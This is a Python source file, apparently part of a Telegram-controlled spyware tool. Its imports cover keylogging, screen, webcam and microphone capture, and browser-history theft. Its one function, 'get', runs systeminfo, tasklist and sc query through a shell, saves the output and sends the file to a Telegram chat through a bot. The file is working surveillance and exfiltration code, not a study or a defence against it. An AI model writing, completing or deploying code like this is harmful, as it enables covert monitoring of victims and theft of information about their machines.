
import json
import logging
import os
import re
import shutil
import smtplib
import socket
import sys
import time
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from multiprocessing import Process
from pathlib import Path
from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread
# External Modules #
import browserhistory as bh
import cv2
import requests
import sounddevice
from cryptography.fernet import Fernet
from PIL import ImageGrab
from pynput.keyboard import Listener

import telepot

def get(botObj:telepot.Bot, chat_id,path=os.path.join(".","output","systeminfo.txt")):
    """
    Runs an array of commands to gather system and hardware information. All the output is \
    redirected to the system info output file.

    :param sysinfo_file:  The path to the output file for the system information.
    :return:  Nothing
    """
    if (botObj is not None):
        botObj.sendMessage(chat_id, "Scanning...")

    syntax = ['systeminfo', '&', 'tasklist', '&', 'sc', 'query']
    
    try:
        # Setup system info gathering commands child process #
        with Path(path).open('a', encoding='utf-8') as system_info:
            # Setup system info gathering commands child process #
            with Popen(syntax, stdout=system_info, stderr=system_info, shell=True) as get_sysinfo:
                # Execute child process #
                get_sysinfo.communicate(timeout=30)

    # If error occurs during file operation #
    except OSError as file_err:
        print_err(f'Error occurred during file operation: {file_err}')
        logging.exception('Error occurred during file operation: %s\n', file_err)

    # If process error or timeout occurs #
    except TimeoutExpired:
        pass

    if (botObj is not None):
        with Path(path).open('r', encoding='utf-8') as network_io:
            botObj.sendDocument(chat_id, document=network_io, caption="system-info")
